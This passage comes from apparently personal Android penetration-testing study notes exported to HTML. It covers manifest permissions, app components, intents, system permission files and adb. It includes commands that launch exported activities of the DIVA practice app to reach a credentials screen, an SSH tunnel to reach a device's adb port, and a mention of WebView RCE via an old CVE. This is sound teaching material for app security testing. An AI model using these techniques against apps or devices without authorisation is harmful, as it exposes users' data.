&lt;permission android:label=&quot;Allows editing of the Key in Sieve&quot; android:name=&quot;com.mwr.example.sieve.WRITE_KEYS&quot; android:protectionLevel=&quot;dangerous&quot;/&gt;</code></pre><blockquote id="9be14890-4558-4d3a-aa64-f99456068864" class="">- These lines define <mark class="highlight-pink">custom permissions</mark> for the app. These custom permissions are related to <em><span style="border-bottom:0.05em solid">reading and writing keys</span></em> and are marked with a protection level of “<mark class="highlight-orange">dangerous</mark>.” <p id="dd3dc48c-bd43-466b-8185-036878c80b08" class="">- Evaluate how these custom permissions are used in the app and if they are correctly protected and justified, custom permissions are related to the context of the app.</p></blockquote><p id="b21f4b6d-a322-4c32-9270-2f31ac745840" class="">
</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="aab2bf84-cdab-4275-b70a-5f40133389ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;uses-sdk android:minSdkVersion=&quot;8&quot; android:targetSdkVersion=&quot;17&quot;/&gt;</code></pre><ul id="3e16d6fc-e69b-4cff-891b-74b6ec4788e2" class="bulleted-list"><li style="list-style-type:disc"><code>android:minSdkVersion</code>: This attribute specifies the<mark class="highlight-orange"> minimum Android version</mark> (<strong>API level</strong>) that your application can run on.</li></ul><ul id="19989418-5d13-4013-823f-5e81f83bf8b5" class="bulleted-list"><li style="list-style-type:disc"><code>android:targetSdkVersion</code>: This attribute specifies the <mark class="highlight-orange">target Android version that your application was designed for</mark>. </li></ul><blockquote id="f2a1d0d5-bfb3-4896-af9c-42ac380ba4f4" class=""><strong>This doesn&#x27;t necessarily mean your application won&#x27;t run on newer versions; rather, it indicates that you&#x27;ve tested and optimized your app for this particular version.</strong></blockquote><blockquote id="90b56a33-139f-4073-a850-1bf3a468d030" class="">If the <mark class="highlight-pink">targetSDK version is &lt;= 17</mark>, and the stars align <mark class="highlight-pink">you could have RCE via CVE-2012–6636</mark>.</blockquote><figure id="aed565eb-6ad2-41c5-b85b-c344a98e9533" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%209.png"><img style="width:192px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%209.png"/></a><figcaption><mark class="highlight-blue">sdk </mark>version ⇒ Android version</figcaption></figure><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Components</summary><div class="indented"><ul id="1aa4bbf4-f281-41cc-9f71-c8f98e4d0b07" class="bulleted-list"><li style="list-style-type:disc"><code>&lt;activity&gt;</code> tag which contains all the activities on the app <strong>UI</strong> like <mark class="highlight-teal">buttons</mark>, <mark class="highlight-teal">headers </mark>and so on. <ul id="116a8b28-8d94-4947-8e82-f4fc3a5f2332" class="bulleted-list"><li style="list-style-type:circle">Function <code>onCreate</code> is your start point.</li></ul></li></ul><ul id="6610b69b-617b-4d1a-80d5-2b0ce03a6bd0" class="bulleted-list"><li style="list-style-type:disc">Exported Components<ul id="06985306-24ff-4906-899b-06cbf4f642f5" class="bulleted-list"><li style="list-style-type:circle"><code>android:exported=&quot;true&quot;</code>  This means, that activity is <em><span style="border-bottom:0.05em solid"><strong>Explicitly Exported</strong></span></em> <mark class="highlight-blue_background">“can be called by other apps”.</mark></li></ul><ul id="209bded2-7ba0-42bc-a4dc-5979feff60f9" class="bulleted-list"><li style="list-style-type:circle">Specifying <code>&lt;intent-filter&gt;</code> to any activity makes it <em><span style="border-bottom:0.05em solid"><strong>Implicitly Exported </strong></span></em></li></ul></li></ul><ul id="a148ad0f-279e-41e8-a702-e498e66f656d" class="bulleted-list"><li style="list-style-type:disc">Intents:<ul id="167b2044-2554-46f5-ab15-e0b4e1a92f6b" class="bulleted-list"><li style="list-style-type:circle"><code>&lt;intent&gt;</code> <mark class="highlight-orange">are messages that</mark><em><span style="border-bottom:0.05em solid"><mark class="highlight-orange"> allow components to request actions</mark></span></em><mark class="highlight-orange"> from </mark><em><span style="border-bottom:0.05em solid"><mark class="highlight-orange">other components or apps</mark></span></em><em><span style="border-bottom:0.05em solid">.</span></em></li></ul><ul id="bfc33e14-5323-4024-8ba1-e7afbaff820f" class="bulleted-list"><li style="list-style-type:circle">The Intents can be:<ul id="dcc205c6-4247-4d97-b3ee-93f7d2ad9787" class="bulleted-list"><li style="list-style-type:square"><mark class="highlight-pink">broadcast intent ⇒ </mark>is broadcast system-wide and can be received by any component that has registered to receive such broadcasts. like <code><strong>ACTION_BATTERY_LOW</strong></code>, <code><strong>ACTION_BOOT_COMPLETED</strong></code></li></ul><ul id="772f4d1a-1f82-4003-a057-658d0e7d7bc4" class="bulleted-list"><li style="list-style-type:square"><mark class="highlight-pink">explicit intent ⇒ </mark>refers to a targeted Component </li></ul><ul id="0bfe2074-7aac-41bb-ba85-ba83fc503d80" class="bulleted-list"><li style="list-style-type:square"><mark class="highlight-pink">implicit intent ⇒</mark>  there’s <mark class="highlight-blue_background">Action defined inside it</mark>, <mark class="highlight-blue_background">don’t define the component it addresses</mark> , just the action, and see which component will listen using an intent-filter  ⇒ that will lead to  allowing user to choose by which activity to continue with “ex. Location”</li></ul><figure id="05cb6b35-3dea-41b5-9210-7b1f220caf0d" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2010.png"><img style="width:672px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2010.png"/></a></figure></li></ul><ul id="60db8d77-c007-4eaa-b867-e1fdd5e85b4f" class="bulleted-list"><li style="list-style-type:circle"><code>&lt;intent-filter&gt;</code> it filters which intent should you reply on.<ul id="b556b036-2e41-4577-8080-7f3baa7073e3" class="bulleted-list"><li style="list-style-type:square"> it contains: <code>&lt;action&gt;</code>  that specifies the action(s) associated with an intent filter. Each <code><strong>&lt;action&gt;</strong></code> element defines a particular type of action that the component can respond to.</li></ul></li></ul></li></ul><ul id="daa18bd6-88e5-4e7f-a140-dd27caa8bee4" class="bulleted-list"><li style="list-style-type:disc"><code>&lt;service&gt;</code>  activities run on the background <em>“</em><strong><em>NOT SEEN</em></strong><em> by user”</em> like <em>music apps, battery life monitoring or app uses GPS service.</em><ul id="4de45713-1c74-4d68-add1-416e73144ce3" class="bulleted-list"><li style="list-style-type:circle"><code>onStartCommand</code> Function</li></ul></li></ul><ul id="008090ba-8317-4ed1-a2dd-4800ab10fd17" class="bulleted-list"><li style="list-style-type:disc"><code>&lt;receiver&gt;</code> its a broadcast receiver which used to <em><span style="border-bottom:0.05em solid">communicate</span></em> with other apps or with the OS as it handle incoming broadcast intents and perform some action based on the content of those intents.<ul id="0abc7595-0ec4-479f-82c3-1f1096414889" class="bulleted-list"><li style="list-style-type:circle">For example when System send message “<strong>Broadcast Intent”</strong> that the battery is low. </li></ul><ul id="818b8401-93d2-4bc6-a982-9827ae04ee26" class="bulleted-list"><li style="list-style-type:circle"><code>registerReciever</code> function for <em><span style="border-bottom:0.05em solid"><strong>Dynamic Receivers</strong></span></em></li></ul><ul id="6556f91f-4863-4c79-b6f3-4d34c114447d" class="bulleted-list"><li style="list-style-type:circle"><code>onRecieve</code> Function</li></ul><figure class="block-color-gray_background callout" style="white-space:pre-wrap;display:flex" id="25c50c98-1db0-4eea-b76b-ef648670dc67"><div style="font-size:1.5em"><span class="icon">💡</span></div><div style="width:100%">Some times the <code>&lt;intent-filter&gt;</code> of the <code>&lt;receiver&gt;</code> is defined in the source code not in the manifest file. (<strong>Dynamic Receiver</strong>)</div></figure></li></ul><ul id="90fe40d7-db04-4a8c-966f-1dc189aaf791" class="bulleted-list"><li style="list-style-type:disc"><code>&lt;provider&gt;</code> This is for the <strong><mark class="highlight-yellow">content provider</mark></strong> component which<strong><em> </em></strong><em><span style="border-bottom:0.05em solid">used to deal with data </span></em><mark class="highlight-teal_background"><em><span style="border-bottom:0.05em solid">when the application want to access the database,</span></em></mark><em><span style="border-bottom:0.05em solid"> it </span></em><mark class="highlight-teal_background"><em><span style="border-bottom:0.05em solid">talks to the content provider</span></em></mark><em><span style="border-bottom:0.05em solid"> that </span></em><mark class="highlight-teal_background"><em><span style="border-bottom:0.05em solid">deals with database and brings data for the application</span></em></mark><mark class="highlight-teal_background">.</mark><ul id="7a972beb-3226-40ed-873a-f18bb94e6ae6" class="bulleted-list"><li style="list-style-type:circle"><code>onCreate</code> Function</li></ul></li></ul></div></details><blockquote id="9ad4d892-ab4a-4bbb-b24d-683e18250622" class=""><strong>we have three files are part of the Android operating system and are related to various aspects of the system’s configuration and permissions. Here’s a brief overview of each file</strong></blockquote><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">1. /data/system/<mark class="highlight-pink">packages.xml</mark></summary><div class="indented"><p id="855600a2-6acb-4509-9993-e66e6bd93152" class="">The packages.xml file is located in the /data/system/ directory of an Android device. This file<mark class="highlight-orange"> is used by the Android Package Manager (PackageManager)</mark> to <mark class="highlight-orange">store information about installed packages</mark> (applications) on the device. It <mark class="highlight-orange">contains details about each installed app, such as</mark><mark class="highlight-pink"> package name</mark><mark class="highlight-orange">, </mark><mark class="highlight-pink">version</mark><mark class="highlight-orange">, </mark><mark class="highlight-pink">installation status</mark><mark class="highlight-orange">,</mark><mark class="highlight-pink"> granted permissions</mark><mark class="highlight-orange">, and</mark><mark class="highlight-pink"> other package-related information</mark><mark class="highlight-orange">.</mark></p><p id="527c1301-ab7d-416e-a787-f0eda69d8115" class=""><mark class="highlight-orange">When an app is installed or uninstalled</mark> on the device, the<mark class="highlight-orange"> Package Manager updates this file</mark> to reflect the changes in the system’s package database. The file is essential for keeping track of the installed apps and their permissions.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="44ef6a61-afa2-4d9d-af41-02323e42a570" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27; standalone=&#x27;yes&#x27; ?&gt;
&lt;packages&gt;
    &lt;package name=&quot;com.example.app1&quot; codePath=&quot;/data/app/com.example.app1&quot; nativeLibraryPath=&quot;/data/app/com.example.app1/lib&quot; flags=&quot;...&quot;
        version=&quot;12345&quot; userId=&quot;10000&quot; installer=&quot;com.android.vending&quot;&gt;
        &lt;!-- More details about the package --&gt;
        &lt;sigs count=&quot;1&quot;&gt;
            &lt;cert index=&quot;...&quot; /&gt;
        &lt;/sigs&gt;
        &lt;perms&gt;
            &lt;item name=&quot;android.permission.CAMERA&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;
            &lt;item name=&quot;android.permission.INTERNET&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;
            &lt;!-- More permissions --&gt;
        &lt;/perms&gt;
        &lt;!-- More details about the package --&gt;
    &lt;/package&gt;

    &lt;package name=&quot;com.example.app2&quot; codePath=&quot;/data/app/com.example.app2&quot; nativeLibraryPath=&quot;/data/app/com.example.app2/lib&quot; flags=&quot;...&quot;
        version=&quot;67890&quot; userId=&quot;10001&quot; installer=&quot;com.android.vending&quot;&gt;
        &lt;!-- More details about the package --&gt;
        &lt;sigs count=&quot;1&quot;&gt;
            &lt;cert index=&quot;...&quot; /&gt;
        &lt;/sigs&gt;
        &lt;perms&gt;
            &lt;item name=&quot;android.permission.CAMERA&quot; granted=&quot;true&quot; flags=&quot;0&quot; /&gt;
            &lt;item name=&quot;android.permission.RECORD_AUDIO&quot; granted=&quot;false&quot; flags=&quot;0&quot; /&gt;
            &lt;!-- More permissions --&gt;
        &lt;/perms&gt;
        &lt;!-- More details about the package --&gt;
    &lt;/package&gt;
&lt;/packages&gt;</code></pre><p id="eab3d1ac-f5b0-4f66-8b07-40b141c969e1" class="">the content is something like is as we see<mark class="highlight-orange"> every app has its own </mark><code>userid</code> that can access the data belongs to this app only.</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">2. /etc/permissions/<mark class="highlight-pink">platform.xml</mark></summary><div class="indented"><p id="968c785b-6f43-489f-838b-df4c92e8363d" class="">The platform.xml file <mark class="highlight-orange">is part of the Android operating system’s configuration</mark> and is located in the /etc/permissions/ directory. This file <mark class="highlight-orange">defines the system-wide permissions for all applications on the device</mark>. It <mark class="highlight-orange">contains a list of permission</mark> definitions, each with a unique name and protection level.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1ab5ae72-a6bd-4ffc-97b0-32d3f26c8be1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;

&lt;permissions&gt;
    &lt;!-- Define permission groups --&gt;
    &lt;permission-group name=&quot;android.permission-group.LOCATION&quot; &gt;
        &lt;item name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; /&gt;
        &lt;item name=&quot;android.permission.ACCESS_COARSE_LOCATION&quot; /&gt;
    &lt;/permission-group&gt;

    &lt;!-- Define permissions --&gt;
    &lt;permission name=&quot;android.permission.ACCESS_FINE_LOCATION&quot; &gt;
        &lt;group gid=&quot;android.permission-group.LOCATION&quot; /&gt;
        &lt;!-- More details about the permission --&gt;
    &lt;/permission&gt;

    &lt;!-- More permission groups and permissions --&gt;
&lt;/permissions&gt;</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">3. <mark class="highlight-pink">Android_filesystem_config.h</mark></summary><div class="indented"><p id="09c94020-9ac3-4a96-8494-3d0cd3220cbd" class="">The Android_filesystem_config.h file is a<mark class="highlight-orange"> header file in the Android source code</mark>. It defines the <mark class="highlight-orange">permissions and attributes</mark> for various directories and files in the Android filesystem. Each entry in this file specifies the default permissions (owner, group, others) and the SELinux context for a specific path in the Android filesystem.</p><p id="aecb5ed0-f3cf-4a5d-abcd-0b2eccfe5ef8" class="">When the Android system is built, this file is used to set the appropriate permissions and attributes for different directories and files. It ensures that the correct security context and permissions are applied to system resources during runtime.</p><blockquote id="ec8829bc-03dd-478a-a03f-432e3d16b9a5" class="">note that these files are part of the Android operating system’s internal configuration and are not meant to be directly modified or accessed by regular users “until you root the device” or third-party applications. Making changes to these files without proper understanding or authorization can lead to system instability or security issues. They are primarily used by the Android OS itself to manage app installations, permissions, and filesystem configurations.</blockquote></div></details><p id="9289d0f2-8233-46ac-ae8c-e3b5bb932f06" class="">⇒ <strong>(</strong><mark class="highlight-orange"><strong>Activities, Services, Broadcast Receivers, Content Providers</strong></mark><strong>) that 50% of vulns</strong>, </p><p id="f93ce352-7257-4ea1-9d94-7d57b78dc7f1" class="">⇒ and 50% are related to <mark class="highlight-orange">network traffic (e.g., HTTPS)</mark>.</p></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><mark class="highlight-red"><strong>resources.arsc/res/values/string.xml</strong></mark><strong><mark class="highlight-orange"> </mark></strong><mark class="highlight-default"><strong>⇒ you can start the assessment by checking this file</strong></mark></summary><div class="indented"><figure id="84636f00-d741-4f64-ba1d-29d114c684aa" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2011.png"><img style="width:576px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2011.png"/></a></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0"><strong>Current Activity</strong></summary><div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6ae2eeb3-3796-403c-a845-cba7eb5f781a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">adb shell dumpsys window | grep &#x27;mCurrentFocus&#x27;</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="22570ff8-e9ae-4dde-8930-876e5b2d4009" class="code"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">adb shell dumpsys window | select-string &quot;mCurrentFocus&quot;
adb shell dumpsys activity activities | Select-String &quot;mResumedActivity&quot;</code></pre><figure id="5232de05-19c5-452f-9010-65a2d5e47185" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2012.png"><img style="width:637px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2012.png"/></a></figure><figure id="dc0764c1-c98d-4618-874e-aa4301d7c434" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2013.png"><img style="width:624px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2013.png"/></a></figure><p id="58434735-306a-43fd-98d3-116a284c43b8" class="">The main parts to check when we are testing any apk:</p><div id="b835ff76-ebcb-476a-9632-aa94055cc9a9" class="column-list"><div id="02c1135a-5ae1-4acf-ac44-2008058d42f3" style="width:100%" class="column"><ol type="1" id="48fce908-2daa-471a-8ede-26c06c513924" class="numbered-list" start="1"><li><strong><mark class="highlight-yellow">Software</mark></strong> : its the java code and how it interacts with operating system or with other components.</li></ol><ol type="1" id="d85c0bba-ab05-4ad1-afe3-18d6712e02dc" class="numbered-list" start="2"><li><strong><mark class="highlight-yellow">Web</mark></strong> : Whether the app communicate over network or not, the app requests details and we also intercept these requests [here, the task you make will be a web-pentest more than android]</li></ol><ol type="1" id="4793d61e-5969-4987-a3f3-750d5e37c2a5" class="numbered-list" start="3"><li><strong><mark class="highlight-yellow">Network</mark></strong> : is it http or https, can implement <em><span style="border-bottom:0.05em solid"><strong>SSL pinning</strong></span></em>  or not.</li></ol><ol type="1" id="4a32babc-9116-4c07-b814-ac428206c77f" class="numbered-list" start="4"><li><strong><mark class="highlight-yellow">Interacting with system</mark></strong>  check for sensitive data that stored with unsecured way.</li></ol></div><div id="ec65944b-080c-45fa-953c-18f9b358bbb5" style="width:100%" class="column"><figure id="efe545c2-1357-43c5-8aab-674deaf8428c" class="image" style="text-align:right"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2014.png"><img style="width:336px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2014.png"/></a></figure><p id="e1198bee-89db-4cc6-b1e7-d1decc174ac5" class="">
</p></div></div><div id="0d7d7977-2323-475d-bc18-af03797d0814" class="column-list"><div id="ad2762ca-79a7-4279-8a09-88350c264174" style="width:200.00000000000009%" class="column"><p id="5263ac68-6dc5-4234-9cdb-e4392c54b28a" class=""><strong><mark class="highlight-blue">How software can be analyzed?</mark></strong></p><ol type="1" id="d2f395b5-c200-4117-bf17-f9e4d525dcab" class="numbered-list" start="1"><li><mark class="highlight-yellow"><strong>Static Analysis</strong></mark> : by looking at the source code without running the application.</li></ol><ol type="1" id="cd8c7c2e-44da-4c39-bdf7-d7e1396fc09b" class="numbered-list" start="2"><li><strong><mark class="highlight-yellow">Dynamic Analysis</mark></strong> : it happens in runtime and can be done by for example leaking crypto-keys , seeing encrypted values in memory.</li></ol></div><div id="879bd6ce-4e95-4e4f-8df8-51823c80ada6" style="width:100.00000000000003%" class="column"><figure id="be1775f4-589a-4f5e-be0a-832c6cb86005" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2015.png"><img style="width:451px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2015.png"/></a></figure><p id="8c47ddda-82bf-4374-a422-79e7b8aad711" class="">
</p></div></div></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Android Debug Bridge (ADB) tool</summary><div class="indented"><figure id="be651047-96ce-4322-9fad-01d3a8a5f385" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2016.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2016.png"/></a></figure><figure id="7f611fde-46e3-482f-82a5-f635f853efb1" class="image"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2017.png"><img style="width:480px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2017.png"/></a></figure></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">initiate shell through adb</summary><div class="indented"><ol type="1" id="7d53b1aa-d782-42d8-b4a0-fbb13b1cb3a7" class="numbered-list" start="1"><li>After starting Nox<p id="b67776e3-f792-4d91-bf49-8346873164ed" class=""><code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=62001 connectaddress=127.0.0.1 connectport=62001</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="500be231-2161-438e-9544-eaa781b2c151" class="code"><code class="language-Bash">adb connect 192.168.1.8:62001</code></pre></li></ol><ol type="1" id="18a04aa5-30c1-44de-a567-d5a2e56b8bd5" class="numbered-list" start="2"><li>After Closing Nox<p id="991bb346-b145-4f54-9080-703fab0dcc7e" class=""><code>netsh interface portproxy delete v4tov4 listenport=62001 listenaddress=0.0.0.0</code></p></li></ol><ul id="900e83d5-6828-4aa9-b27f-b0f6d09e13e0" class="bulleted-list"><li style="list-style-type:disc">Your device should be set in Developer mode, and the USB Debug is enabled or whatever way you will connect </li></ul><ul id="f0844672-5c0d-4364-96d9-36b40f990486" class="bulleted-list"><li style="list-style-type:disc">Ensure that your Windows firewall allows incoming connections on port 62001.</li></ul><ul id="259ca547-2081-4f6b-89c1-648997d98a07" class="bulleted-list"><li style="list-style-type:disc">in the case of Nox ⇒ it starts by default on <a href="http://localhost">localhost</a> in port 62001<ul id="35d6dad1-89d8-48ba-8909-61f04641e817" class="bulleted-list"><li style="list-style-type:circle">adb connect &lt;HOST_MACHINE&gt;:62001</li></ul><ul id="1d8381f1-fbb0-4ee0-aa7f-e7fa694b752c" class="bulleted-list"><li style="list-style-type:circle">adb shell</li></ul></li></ul><ul id="dde7c45b-3a8d-41a7-8c33-d6a6c04d64ed" class="bulleted-list"><li style="list-style-type:disc">You can execute shell adb commands directly using ⇒ adb shell ….</li></ul><p id="2e709702-c4e0-4e31-bc59-f1c6e96a1160" class=""><strong>Port Tunneling</strong></p><p id="cef9a3bd-2bd2-44d6-a545-b7e2f06190ad" class="">In case the <strong>adb</strong> <strong>port</strong> is only <strong>accessible</strong> from <strong>localhost</strong> in the android device but <strong>you have access via SSH</strong>, you can <strong>forward the port 5555</strong> and connect via adb:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="a8deaf33-0af0-421c-8eae-066a11854cd9" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">ssh -i ssh_key username@10.10.10.10 -L 5555:127.0.0.1:5555 -p 2222

adb connect 127.0.0.1:5555</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">Push actions &amp; WebViews</summary><div class="indented"><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="620be83f-775b-41d0-b6d3-cfaa963923a3" class="code"><code class="language-PowerShell">adb shell am start -a [actionName inside intent-filter]  
#ex: adb shell am start -a jakhar.aseem.diva.action.VIEW_CREDS
or
adb shell am start -n [acivityPackageName with /]
#ex: adb shell am start -n jakhar.aseem.diva/.APICredsActivity</code></pre><details open=""><summary style="font-weight:600;font-size:1.25em;line-height:1.3;margin:0">WebView</summary><div class="indented"><ul id="0bf85b81-7ca6-45ca-ac50-77e10f5a1b23" class="bulleted-list"><li style="list-style-type:disc">We want to be able to control the input to the webView</li></ul><ul id="fee42ea1-b932-4c7a-b9d2-1ee95a1ae834" class="bulleted-list"><li style="list-style-type:disc">Check for Exported activity supports Webview in manifest by searching fot <code>webView</code> or <code>loadUrl</code></li></ul><figure id="d57472e1-da71-4ff5-9239-f11063729602" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2018.png"><img style="width:912px" src="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2018.png"/></a></figure><ul id="1237e0b4-2e06-4ffd-89ab-70d5f010f9f1" class="bulleted-list"><li style="list-style-type:disc">head to <code>onCreate</code> if activity , <code>onStartCommand</code> if service</li></ul><figure id="a56cb61d-926f-41a2-b7c1-bf13555be955" class="image" style="text-align:center"><a href="Android%20Pentest%20-%20Abdelaziz%20Elhawary%209534581b85a641999485f2e956126666/Untitled%2019.png"><img style="width:816px" 